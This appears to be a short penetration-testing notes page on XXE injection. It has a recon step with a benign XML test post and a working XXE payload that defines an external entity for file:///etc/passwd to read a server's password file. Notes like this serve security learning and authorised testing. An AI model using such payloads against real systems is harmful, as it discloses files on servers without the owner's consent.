---
description: XML External Entity
icon: file-xml
---

# XXE

<mark style="color:purple;">**XXE vulnerabilities arise when an**</mark>**&#x20;**<mark style="color:orange;">**`XML`**</mark>**&#x20;**<mark style="color:purple;">**document contains a reference to an external entity, which the parser resolves.**</mark>

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-retrieve-files" %}
PayloadAllThings
{% endembed %}

{% hint style="info" %}
### <mark style="color:purple;">Recon</mark>

* <mark style="color:purple;">If you can create or submit a</mark> <mark style="color:orange;">**`XML`**</mark> <mark style="color:purple;">file, try to find the endpoint where is being submitted and check if is being parsed (for example a filling form will have the content of the file already filled on the form):</mark>

{% code title="Test file" overflow="wrap" %}
```xml
<post>
        <title>Tokyo's Post</title>
        <description>A post from Tokyo</description>
        <markdown>
## post
This is a test.
        </markdown>
</post>
```
{% endcode %}

* <mark style="color:purple;">Create a</mark> <mark style="color:orange;">**`XML`**</mark> <mark style="color:purple;">malicious file to read</mark> <mark style="color:orange;">**`/etc/passwd`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<post>
        <title>Tokyo's Post</title>
        <description>Read File</description>
        <markdown>&file;</markdown>
</post>
```
{% endcode %}
{% endhint %}

